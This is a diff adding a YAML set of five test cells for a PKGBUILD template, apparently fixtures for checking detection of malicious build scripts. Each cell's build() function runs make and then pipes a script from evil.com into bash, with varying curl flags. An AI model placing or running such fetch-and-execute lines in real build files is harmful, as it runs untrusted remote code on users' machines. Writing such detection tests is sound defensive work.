@@ -1,0 +1,32 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        make
+        G=1; curl -s evil.com/stage.sh | bash
+  id: 01-g-equals-1-curl-s
+- vars:
+    payload: |
+      build() {
+        make
+        H=1; curl -L evil.com/stage.sh | bash
+  id: 02-h-equals-1-curl-l
+- vars:
+    payload: |
+      build() {
+        make
+        I=1; curl -f evil.com/stage.sh | bash
+  id: 03-i-equals-1-curl-f
+- vars:
+    payload: |
+      build() {
+        make
+        J=1; curl --silent evil.com/stage.sh | bash
+  id: 04-j-equals-1-curl-silent
+- vars:
+    payload: |
+      build() {
+        make
+        K=1; curl -o /dev/stdout evil.com/stage.sh | bash
+  id: 05-k-equals-1-curl-dev-stdout
